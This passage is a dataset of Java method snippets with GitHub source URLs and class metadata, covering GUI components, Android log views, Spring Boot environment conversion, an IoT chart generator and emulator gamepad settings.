"https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/impl/ModeComponent.java", "stars": "12", "class": {"name": "ModeComponent", "extends": "Component", "implements": null, "modifiers": ["public"]}}, {"method_name": "drawScreen", "params": ["int", "int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void drawScreen(int mx, int my, float partialTicks) {        super.drawScreen(mx, my, partialTicks);        RenderUtil.drawRect2(getX(), getY(), getW(), getH(), new Color(5, 5, 5, 200).getRGB());        Menu.font.drawStringWithShadow(StringUtils.capitalize(getLabel()) + \": \" + StringUtils.capitalize(ModeStringProperty.getValue().toLowerCase()), getX() + 2, getY() + getH() / 2 - Menu.font.getHeight() / 2,  -1);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/impl/ModeComponent.java", "stars": "12", "class": {"name": "ModeComponent", "extends": "Component", "implements": null, "modifiers": ["public"]}}, {"method_name": "mouseClicked", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseClicked(int mx, int my, int button) {        super.mouseClicked(mx, my, button);        final boolean hovered = MouseUtil.withinBounds(mx, my, getX(), getY(), getW(), getH());        if (button == 0 && hovered) {            ModeStringProperty.increment();        }        if (button == 1 && hovered) {            ModeStringProperty.decrement();        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/impl/ModeComponent.java", "stars": "12", "class": {"name": "ModeComponent", "extends": "Component", "implements": null, "modifiers": ["public"]}}, {"method_name": "registerEvents", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void registerEvents() {        this.events.put(IncomingHeaders.CLIENT_PONG, ClientPongEvent.class);        this.events.put(IncomingHeaders.CLIENT_RELEASE_VERSION, ClientReleaseVersionEvent.class);        this.events.put(IncomingHeaders.SECURITY_MACHINE, SecurityMachineEvent.class);        this.events.put(IncomingHeaders.SECURITY_TICKET, SecurityTicketEvent.class);    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/communication/messages/NitroMessages.java", "stars": "2", "class": {"name": "NitroMessages", "extends": "MessageConfiguration", "implements": null, "modifiers": ["public"]}}, {"method_name": "registerComposers", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void registerComposers() {        this.composers.put(OutgoingHeaders.CLIENT_PING, ClientPingComposer.class);        this.composers.put(OutgoingHeaders.AUTHENTICATED, SecurityAuthenticatedComposer.class);        this.composers.put(OutgoingHeaders.SECURITY_MACHINE, SecurityMachineComposer.class);    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/communication/messages/NitroMessages.java", "stars": "2", "class": {"name": "NitroMessages", "extends": "MessageConfiguration", "implements": null, "modifiers": ["public"]}}, {"method_name": "inflateViews", "params": [], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View inflateViews() {        mScrollView = new ScrollView(getActivity());        ViewGroup.LayoutParams scrollParams = new ViewGroup.LayoutParams(                ViewGroup.LayoutParams.MATCH_PARENT,                ViewGroup.LayoutParams.MATCH_PARENT);        mScrollView.setLayoutParams(scrollParams);        mLogView = new LogView(getActivity());        ViewGroup.LayoutParams logParams = new ViewGroup.LayoutParams(scrollParams);        logParams.height = ViewGroup.LayoutParams.WRAP_CONTENT;        mLogView.setLayoutParams(logParams);        mLogView.setClickable(true);        mLogView.setFocusable(true);        mLogView.setTypeface(Typeface.MONOSPACE);        // Want to set padding as 16 dips, setPadding takes pixels.  Hooray math!        int paddingDips = 16;        double scale = getResources().getDisplayMetrics().density;        int paddingPixels = (int) ((paddingDips * (scale)) + .5);        mLogView.setPadding(paddingPixels, paddingPixels, paddingPixels, paddingPixels);        mLogView.setCompoundDrawablePadding(paddingPixels);        mLogView.setGravity(Gravity.BOTTOM);        mLogView.setTextAppearance(getActivity(), android.R.style.TextAppearance_Holo_Medium);        mScrollView.addView(mLogView);        return mScrollView;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/common/logger/LogFragment.java", "stars": "74", "class": {"name": "LogFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreateView", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, ViewGroup container,                             Bundle savedInstanceState) {        View result = inflateViews();        mLogView.addTextChangedListener(new TextWatcher() {            @Override            public void beforeTextChanged(CharSequence s, int start, int count, int after) {}            @Override            public void onTextChanged(CharSequence s, int start, int before, int count) {}            @Override            public void afterTextChanged(Editable s) {                mScrollView.fullScroll(ScrollView.FOCUS_DOWN);            }        });        return result;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/common/logger/LogFragment.java", "stars": "74", "class": {"name": "LogFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "getLogView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LogView", "snippet": "    public LogView getLogView() {        return mLogView;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/common/logger/LogFragment.java", "stars": "74", "class": {"name": "LogFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "feed", "params": ["Pet"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void feed(Pet pet) { //Pea pet \u662f\u4e00\u4e2a\u7236\u7c7b\u578b\u7684\u5f15\u7528\t\tpet.eat();\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/duotai/Zhuren.java", "stars": "2", "class": {"name": "Zhuren", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        Singleton instance1 = Singleton.INSTANCE;        Singleton instance2 = Singleton.INSTANCE;        System.out.println(instance1 == instance2);        System.out.println(instance1.hashCode());        System.out.println(instance2.hashCode());        instance1.sayOk();    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/singleton/type8/SingletonTest08.java", "stars": "2", "class": {"name": "SingletonTest08", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "startActivity", "params": ["Activity"], "throws": null, "modifiers": ["public", "static"], "return_type": "Intent", "snippet": "    public static Intent startActivity(Activity activity) {        Intent intent = new Intent(activity, TVMainActivity.class);        activity.startActivity(intent);        return intent;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVMainActivity.java", "stars": "4", "class": {"name": "TVMainActivity", "extends": "TVBaseActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        TVButterApplication.getAppContext()                .getComponent()                .inject(this);        super.onCreate(savedInstanceState, R.layout.activity_main);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVMainActivity.java", "stars": "4", "class": {"name": "TVMainActivity", "extends": "TVBaseActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onResume", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onResume() {        super.onResume();        butterUpdateManager.setListener(new ButterUpdateManager.Listener() {            @Override            public void updateAvailable(String filePath) {                TVUpdateActivity.startActivity(TVMainActivity.this);            }        });        butterUpdateManager.checkUpdates(false);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVMainActivity.java", "stars": "4", "class": {"name": "TVMainActivity", "extends": "TVBaseActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "getValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getValue() {        return this.value;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/communication/codec/Byte.java", "stars": "2", "class": {"name": "Byte", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        createPic(\"D:/\");    }", "url": "https://raw.githubusercontent.com/luzy99/IOT-Terminal/master/MqttTrans/src/main/java/com/m5go/plugin/JChart.java", "stars": "2", "class": {"name": "JChart", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createPic", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String createPic(String path) {        StandardChartTheme mChartTheme = new StandardChartTheme(\"CN\");        mChartTheme.setLargeFont(new Font(\"Microsoft YaHei\", Font.PLAIN, 15));        mChartTheme.setExtraLargeFont(new Font(\"Microsoft YaHei\", Font.BOLD, 18));        mChartTheme.setRegularFont(new Font(\"Microsoft YaHei\", Font.PLAIN, 15));        ChartFactory.setChartTheme(mChartTheme);        JFreeChart xychart = createXY();        long timestamp = System.currentTimeMillis()/1000;        String realpath=path+String.valueOf(timestamp)+\".jpg\";        saveAsFile(xychart, realpath, 1000, 600);        return realpath;    }", "url": "https://raw.githubusercontent.com/luzy99/IOT-Terminal/master/MqttTrans/src/main/java/com/m5go/plugin/JChart.java", "stars": "2", "class": {"name": "JChart", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "saveAsFile", "params": ["JFreeChart", "String", "int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void saveAsFile(JFreeChart chart, String outputPath,                                  int weight, int height) {        FileOutputStream out = null;        try {            File outFile = new File(outputPath);            if (!outFile.getParentFile().exists()) {                outFile.getParentFile().mkdirs();            }            out = new FileOutputStream(outputPath);            // \u4fdd\u5b58\u4e3aPNG            // ChartUtilities.writeChartAsPNG(out, chart, 600, 400);            // \u4fdd\u5b58\u4e3aJPEG            ChartUtils.writeChartAsJPEG(out, chart, weight, height);            out.flush();        } catch (IOException e) {            e.printStackTrace();        } finally {            if (out != null) {                try {                    out.close();                } catch (IOException e) {                    e.printStackTrace();                }            }        }    }", "url": "https://raw.githubusercontent.com/luzy99/IOT-Terminal/master/MqttTrans/src/main/java/com/m5go/plugin/JChart.java", "stars": "2", "class": {"name": "JChart", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createXY", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "JFreeChart", "snippet": "    private static JFreeChart createXY() {        //\u52a0\u8f7d\u6570\u636e        if (MqttServer.conn == null) {            MqttServer.connect();        }        HashMap<String, ArrayList<Double>> rawdata = MqttServer.getData();        ArrayList<Double> tmp = rawdata.get(\"tmp\");        ArrayList<Double> hum = rawdata.get(\"hum\");        ArrayList<Double> time = rawdata.get(\"time\");        //create the series - add some dummy data        XYSeries series1 = new XYSeries(\"\u6e29\u5ea6\");        XYSeries series2 = new XYSeries(\"\u6e7f\u5ea6\");        for (int i = 0; i < tmp.size(); i++) {            series1.add(time.get(i), tmp.get(i));            series2.add(time.get(i), hum.get(i));        }        //create the datasets        XYSeriesCollection dataset1 = new XYSeriesCollection();        XYSeriesCollection dataset2 = new XYSeriesCollection();        dataset1.addSeries(series1);        dataset2.addSeries(series2);        //construct the plot        XYPlot plot = new XYPlot();        plot.setDataset(0, dataset1);        plot.setDataset(1, dataset2);        //\u7ebf\u6761\u989c\u8272        plot.setRenderer(0, new XYSplineRenderer());//use default fill paint for first series        XYLineAndShapeRenderer splinerenderer = new XYLineAndShapeRenderer();//        XYSplineRenderer splinerenderer = new XYSplineRenderer();        splinerenderer.setSeriesPaint(0, Color.BLUE);        plot.setRenderer(1, splinerenderer);        //\u5750\u6807\u8f74        NumberAxis tmpAxis = new NumberAxis(\"\u6e29\u5ea6/\u2103\");        tmpAxis.setAutoRange(true);        tmpAxis.setNumberFormatOverride(new DecimalFormat(\"0\"));        tmpAxis.setAutoRangeIncludesZero(false);        plot.setRangeAxis(0, tmpAxis);        NumberAxis humAxis = new NumberAxis(\"\u6e7f\u5ea6/%\");        humAxis.setAutoRange(true);        humAxis.setNumberFormatOverride(new DecimalFormat(\"0.0\"));        humAxis.setAutoRangeIncludesZero(false);        plot.setRangeAxis(1, humAxis);        //X\u8f74        DateAxis dateAxis = new DateAxis();        dateAxis.setDateFormatOverride(new SimpleDateFormat(\"HH:mm\"));        plot.setDomainAxis(dateAxis);        //Map the data to the appropriate axis        plot.mapDatasetToRangeAxis(0, 0);        plot.mapDatasetToRangeAxis(1, 1);        //generate the chart        String title = \"24\u5c0f\u65f6\u6e29\u6e7f\u5ea6\u8d70\u52bf\u56fe\";        SimpleDateFormat fmt = new SimpleDateFormat(\"(MM-dd HH:mm)\");        String timestr = fmt.format(System.currentTimeMillis());        JFreeChart chart = new JFreeChart(title+timestr, null, plot, true);        return chart;    }", "url": "https://raw.githubusercontent.com/luzy99/IOT-Terminal/master/MqttTrans/src/main/java/com/m5go/plugin/JChart.java", "stars": "2", "class": {"name": "JChart", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "convertEnvironmentIfNecessary", "params": ["ConfigurableEnvironment", "Class<StandardEnvironment>"], "throws": null, "modifiers": [], "return_type": "StandardEnvironment", "snippet": "\tStandardEnvironment convertEnvironmentIfNecessary(ConfigurableEnvironment environment,\t\t\tClass<? extends StandardEnvironment> type) {\t\tif (type.equals(environment.getClass())) {\t\t\treturn (StandardEnvironment) environment;\t\t}\t\treturn convertEnvironment(environment, type);\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/EnvironmentConverter.java", "stars": "47572", "class": {"name": "EnvironmentConverter", "extends": null, "implements": null, "modifiers": ["final"]}}, {"method_name": "convertEnvironment", "params": ["ConfigurableEnvironment", "Class<StandardEnvironment>"], "throws": null, "modifiers": ["private"], "return_type": "StandardEnvironment", "snippet": "\tprivate StandardEnvironment convertEnvironment(ConfigurableEnvironment environment,\t\t\tClass<? extends StandardEnvironment> type) {\t\tStandardEnvironment result = createEnvironment(type);\t\tresult.setActiveProfiles(environment.getActiveProfiles());\t\tresult.setConversionService(environment.getConversionService());\t\tcopyPropertySources(environment, result);\t\treturn result;\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/EnvironmentConverter.java", "stars": "47572", "class": {"name": "EnvironmentConverter", "extends": null, "implements": null, "modifiers": ["final"]}}, {"method_name": "createEnvironment", "params": ["Class<StandardEnvironment>"], "throws": null, "modifiers": ["private"], "return_type": "StandardEnvironment", "snippet": "\tprivate StandardEnvironment createEnvironment(Class<? extends StandardEnvironment> type) {\t\ttry {\t\t\treturn type.newInstance();\t\t}\t\tcatch (Exception ex) {\t\t\treturn new StandardEnvironment();\t\t}\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/EnvironmentConverter.java", "stars": "47572", "class": {"name": "EnvironmentConverter", "extends": null, "implements": null, "modifiers": ["final"]}}, {"method_name": "copyPropertySources", "params": ["ConfigurableEnvironment", "StandardEnvironment"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void copyPropertySources(ConfigurableEnvironment source, StandardEnvironment target) {\t\tremovePropertySources(target.getPropertySources(), isServletEnvironment(target.getClass(), this.classLoader));\t\tfor (PropertySource<?> propertySource : source.getPropertySources()) {\t\t\tif (!SERVLET_ENVIRONMENT_SOURCE_NAMES.contains(propertySource.getName())) {\t\t\t\ttarget.getPropertySources().addLast(propertySource);\t\t\t}\t\t}\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/EnvironmentConverter.java", "stars": "47572", "class": {"name": "EnvironmentConverter", "extends": null, "implements": null, "modifiers": ["final"]}}, {"method_name": "isServletEnvironment", "params": ["Class<?>", "ClassLoader"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "\tprivate boolean isServletEnvironment(Class<?> conversionType, ClassLoader classLoader) {\t\ttry {\t\t\tClass<?> webEnvironmentClass = ClassUtils.forName(CONFIGURABLE_WEB_ENVIRONMENT_CLASS, classLoader);\t\t\treturn webEnvironmentClass.isAssignableFrom(conversionType);\t\t}\t\tcatch (Throwable ex) {\t\t\treturn false;\t\t}\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/EnvironmentConverter.java", "stars": "47572", "class": {"name": "EnvironmentConverter", "extends": null, "implements": null, "modifiers": ["final"]}}, {"method_name": "removePropertySources", "params": ["MutablePropertySources", "boolean"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void removePropertySources(MutablePropertySources propertySources, boolean isServletEnvironment) {\t\tSet<String> names = new HashSet<>();\t\tfor (PropertySource<?> propertySource : propertySources) {\t\t\tnames.add(propertySource.getName());\t\t}\t\tfor (String name : names) {\t\t\tif (!isServletEnvironment || !SERVLET_ENVIRONMENT_SOURCE_NAMES.contains(name)) {\t\t\t\tpropertySources.remove(name);\t\t\t}\t\t}\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/EnvironmentConverter.java", "stars": "47572", "class": {"name": "EnvironmentConverter", "extends": null, "implements": null, "modifiers": ["final"]}}, {"method_name": "setAxisKeyProcessor", "params": ["KeyProcessor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAxisKeyProcessor(KeyProcessor akp) {        axisKeyProcessor = akp;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "getAxisKeyProcessor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "KeyProcessor", "snippet": "    public KeyProcessor getAxisKeyProcessor() {        return axisKeyProcessor;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "setButtonKeyProcessor", "params": ["KeyProcessor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setButtonKeyProcessor(KeyProcessor kp) {        buttonKeyProcessor = kp;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "getButtonKeyProcessor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "KeyProcessor", "snippet": "    public KeyProcessor getButtonKeyProcessor() {        return buttonKeyProcessor;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "setController", "params": ["Controller"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setController(Controller controller) {        this.controller = controller;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "getController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Controller", "snippet": "    public Controller getController() {        return controller;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "dumpTable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void dumpTable() {        for (int i = 0; i < 9; i++) {            System.out.print(i + \" : \");            for(int j = 0; j < 11; j++) {                System.out.print(stateTransitionTable[i][j] + \" \");            }            System.out.println();        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "setAxisType", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAxisType(int type) {        selectedAxisType = type;        switch (type) {        case AXIS_XY:        case AXIS_RXRY:        case AXIS_ZRZ:            stateTransitionTable = stateTransitionTable84;            break;        case AXIS_POV:            stateTransitionTable = stateTransitionTableForPov;            break;        default:            stateTransitionTable = stateTransitionTable84;            break;        }        // dumpTable();    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "getAxisType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getAxisType() {        return selectedAxisType;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "getDirection", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getDirection() {        return direction;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "setPropertyOfGamepadUse", "params": ["boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setPropertyOfGamepadUse(boolean value) {        Application.getProperties().setProperty(PROPERTY_GAMEPAD_USE, Boolean.toString(value));    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "getPropertyOfGamepadUse", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean getPropertyOfGamepadUse() {        String m = Application.getProperties().getProperty(PROPERTY_GAMEPAD_USE);        if (m == null) {            return false;        }        else {            return Boolean.parseBoolean(m);        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "setPropertyOfGamepadName", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setPropertyOfGamepadName(String value) {        Application.getProperties().setProperty(PROPERTY_GAMEPAD_NAME, value);    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "getPropertyOfGamepadName", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getPropertyOfGamepadName() {        String m = Application.getProperties().getProperty(PROPERTY_GAMEPAD_NAME);        if (m == null) {            return \"\";        }        else {            return m;        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "setPropertyOfGamepadMappingMode", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setPropertyOfGamepadMappingMode(int mode) {        String mode_string;        switch (mode) {        case MODE_KEYBOARD:            mode_string = \"keyboard\";            break;        case MODE_NATIVE:            mode_string = \"native\";            break;        default:            mode_string = null;            break;        }        if (mode_string != null) {            Application.getProperties().setProperty(PROPERTY_GAMEPAD_MAPPING_MODE, mode_string);        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "getPropertyOfGamepadMappingMode", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int getPropertyOfGamepadMappingMode() {        String m = Application.getProperties().getProperty(PROPERTY_GAMEPAD_MAPPING_MODE);        if (m == null) {            return MODE_KEYBOARD;        }        else if (m.equals(\"keyboard\")) {            return MODE_KEYBOARD;        }        else if (m.equals(\"native\")) {            return MODE_NATIVE;        }        else {            return MODE_UNDEFINED;        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "setPropertyOfGamepadAxisUsed", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setPropertyOfGamepadAxisUsed(int mode) {        String mode_string;        switch (mode) {        case AXIS_XY:            mode_string = \"xy\";            break;        case AXIS_RXRY:            mode_string = \"rxry\";            break;        case AXIS_ZRZ:            mode_string = \"zrz\";            break;        case AXIS_POV:            mode_string = \"pov\";            break;        default:            mode_string = null;            break;        }        if (mode_string != null) {            Application.getProperties().setProperty(PROPERTY_GAMEPAD_AXIS_USED, mode_string);        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "getPropertyOfGamepadAxisUsed", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int getPropertyOfGamepadAxisUsed() {        String m = Application.getProperties().getProperty(PROPERTY_GAMEPAD_AXIS_USED);        if (m == null) {            return AXIS_XY;        }        else if (m.equals(\"xy\")) {            return AXIS_XY;        }        else if (m.equals(\"rxry\")) {            return AXIS_RXRY;        }        else if (m.equals(\"zrz\")) {            return AXIS_ZRZ;        }        else if (m.equals(\"pov\")) {            return AXIS_POV;        }        else {            return AXIS_UNDEFINED;        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "setPropertyOfGamepadAxisMapping", "params": ["ComponentStatus"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setPropertyOfGamepadAxisMapping(ComponentStatus[] mapping) {        StringBuilder sb = new StringBuilder();        for (int i = 0; i < mapping.length; i++) {            sb.append(Integer.toString(mapping[i].getKeyCode()));            sb.append(\" \");        }        Application.getProperties().setProperty(PROPERTY_GAMEPAD_AXIS_MAPPING, sb.toString());    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "getPropertyOfGamepadAxisMapping", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ComponentStatus", "snippet": "    public static ComponentStatus[] getPropertyOfGamepadAxisMapping() {        String m = Application.getProperties().getProperty(PROPERTY_GAMEPAD_AXIS_MAPPING);        ComponentStatus[] mapping = new ComponentStatus[GAMEPAD_NUMBER_OF_DIRECTIONS];        if (m == null) {            for (int i = 0; i < mapping.length; i++) {                mapping[i] = new ComponentStatus(i, KeyEvent.VK_UNDEFINED);            }        }        else {            String[] splitted = m.split(\"\\\\s+\", 0);            for (int i = 0; i < Math.min(mapping.length, splitted.length); i++) {                mapping[i] = new ComponentStatus(i, Integer.parseInt(splitted[i]));            }            for (int i = Math.min(mapping.length, splitted.length); i < GAMEPAD_NUMBER_OF_DIRECTIONS; i++) {                mapping[i] = new ComponentStatus(i, -1);            }        }        return mapping;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/Gamepad.java", "stars": "4", "class": {"name": "Gamepad", "extends": "Thread", "implements": ["Device"], "modifiers": ["public"]}}, {"method_name": "setPropertyOfGamepadButtonMapping", "params": ["ComponentStatus"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setPropertyOfGamepadButtonMapping(ComponentStatus[] mapping) {        StringBuffer sb = new StringBuffer();        for (int i = 0; i < mapping.length; i++) {            sb.append(Integer.toString(mapping[i].getKeyCode()));            sb.append(\" \");        }        Application.getProperties().setProperty(PROPERTY_GAMEPAD_BUTTON_MAPPING, sb.toString());    }", "url": 